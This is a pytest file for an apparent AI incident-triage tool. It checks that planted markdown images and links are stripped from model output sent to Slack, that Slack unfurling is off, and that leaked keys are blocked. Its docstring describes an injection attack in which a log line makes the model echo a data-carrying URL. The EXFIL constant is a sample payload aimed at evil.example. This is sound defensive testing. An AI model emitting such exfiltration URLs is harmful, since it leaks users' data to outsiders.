"""The outbound gate v0 (Phase 0): G3 untrusted-text hygiene, G5 leak block, and the Slack wiring.

The attack these pin: a log line (anyone who can make the application log can write one) carries a
markdown image or link whose URL holds data; the model repeats it in its hypothesis; the report goes
to Slack; Slack's servers fetch the URL (unfurling) or a person clicks it - data out, no click needed.
"""

from __future__ import annotations

from test_chatops import _CaptureSink
from warden import chatops
from warden.gate import enforce, hedge, leaked_kinds, sanitise_text
from warden.models import (
    ActionKind,
    Alert,
    Citation,
    ContextBundle,
    RemediationProposal,
    RootCause,
    Severity,
    Verdict,
    VerdictStatus,
)
from warden.reporting import build_report

EXFIL = "![x](https://evil.example/c?d=SECRETDATA) see [runbook](https://evil.example/r) https://evil.example/p <img src=x>"


def _alert():
    return Alert(alert_id="inc-7", name="CheckoutErrors", severity=Severity.high, service="checkout",
                 environment="staging", summary="5xx", started_at="2026-09-27T00:00:00Z")


def _report(hypothesis: str, logs: list[str] | None = None):
    return build_report(
        _alert(), context=ContextBundle(logs=logs or [f"checkout ERROR {EXFIL}"]),
        root_cause=RootCause(hypothesis=hypothesis, confidence=0.6),
        proposal=RemediationProposal(action=ActionKind.escalate_to_human, target="checkout", reasoning=EXFIL,
                                     expected_effect="a person looks", blast_radius="single_pod",
                                     reversible=True))


def test_a_planted_image_or_link_echoed_by_the_model_never_reaches_the_slack_payload():
    sink = _CaptureSink()
    chatops.notify(_report(f"The cause is {EXFIL}"), [sink])
    outside_code = sanitise_text(sink.text) == sink.text  # already clean: nothing left to strip
    assert outside_code
    lines, in_code = [], False
    for line in sink.text.split("\n"):
        if line.lstrip().startswith("```"):
            in_code = not in_code
            continue
        if not in_code:
            lines.append(line)
    prose = "\n".join(lines)
    assert "evil.example" not in prose and "![" not in prose and "<img" not in prose
    assert "[link removed]" in prose or "[image removed]" in prose
    # the structured copy (a generic webhook sends it) is cleaned too
    assert "evil.example" not in str(sink.data["root_cause"]) and "evil.example" not in str(sink.data["proposal"])
    assert sink.data["gate"] == "REWRITE"


def test_a_log_line_cannot_close_the_code_fence():
    """A fence closes only on a line that STARTS with ```. A multi-line log message (CloudWatch keeps
    them whole) can put ``` at the start of a physical line; everything after would render as live
    markdown. Plant-checked: without the defuse in reporting._code this fails."""
    r = _report("h", logs=["checkout ERROR bad input\n```\n![x](https://evil.example/leak)\n```"])
    in_code, outside = False, []
    for line in r.markdown.split("\n"):
        if line.startswith("```"):
            in_code = not in_code
            continue
        if not in_code:
            outside.append(line)
    assert not in_code, "fences stay balanced"
    assert not any("evil.example/leak" in line for line in outside)


def test_slack_is_told_not_to_unfurl(monkeypatch):
    sent = {}
    monkeypatch.setattr(chatops, "_post_json",
                        lambda url, payload, sink: sent.update(payload) or chatops.Notification(sink, True, "ok"))
    chatops.SlackWebhookSink("https://example.invalid/hook", live=True).send("text", {})
    assert sent["unfurl_links"] is False and sent["unfurl_media"] is False


def test_a_secret_still_in_the_outgoing_text_blocks_the_message():
    leaky = "Report\nkey AKIAIOSFODNN7EXAMPLE in the config"
    assert leaked_kinds(leaky)
    g = enforce(leaky, alert_id="inc-7")
    assert g.verdict == "BLOCK" and "AKIA" not in g.text and "withheld" in g.text and "inc-7" in g.text


def test_identifiers_an_operator_may_show_do_not_block_and_clean_text_passes():
    assert enforce("user a@corp.io on 10.2.3.4").verdict == "PASS"
    assert enforce("## Heading\n```\nhttps://in.code/is-verbatim\n```").verdict == "PASS"


def test_notify_sends_the_stub_and_no_data_when_blocked(monkeypatch):
    real = chatops.enforce  # a leak the pipeline would have to MISS first: simulated at the gate's input
    monkeypatch.setattr(chatops, "enforce", lambda text, alert_id="": real("AKIAIOSFODNN7EXAMPLE", alert_id=alert_id))
    sink = _CaptureSink()
    chatops.notify(_report("h"), [sink])
    assert "withheld" in sink.text and sink.data == {"withheld": True, "gate": "BLOCK",
                                                     "reasons": sink.data["reasons"]}


def test_g2_marks_claims_warden_cannot_verify():
    assert hedge("No customer impact; no data was lost.") == \
        "[unverified: No customer impact]; [unverified: no data was lost]."
    assert hedge("The incident has been resolved") == "The incident [unverified: has been resolved]"
    assert hedge("errors are now fixed") == "errors [unverified: are now fixed]"
    for fine in ("The root cause is a bad deploy", "a fix was deployed", "roll back to resolve it",
                 "users see 5xx"):
        assert hedge(fine) == fine


def test_the_report_marks_model_claims_and_shows_what_was_cited():
    rc = RootCause(hypothesis="A bad deploy. There is no customer impact.", confidence=0.7,
                   citations=[Citation(id="L1", quote="checkout ERROR")])
    r = build_report(_alert(), context=ContextBundle(logs=["checkout ERROR boom"]), root_cause=rc,
                     verdict=Verdict(status=VerdictStatus.escalated, policy_ids=["P13-UNGROUNDED"]))
    assert "[unverified: no customer impact]" in r.markdown
    assert "L1: checkout ERROR" in r.markdown and "Not grounded" in r.markdown
    assert r.data["root_cause"]["grounded"] is False
    grounded = build_report(_alert(), context=ContextBundle(logs=["x"]), root_cause=rc,
                            verdict=Verdict(status=VerdictStatus.escalated, policy_ids=[]))
    assert "Not grounded" not in grounded.markdown
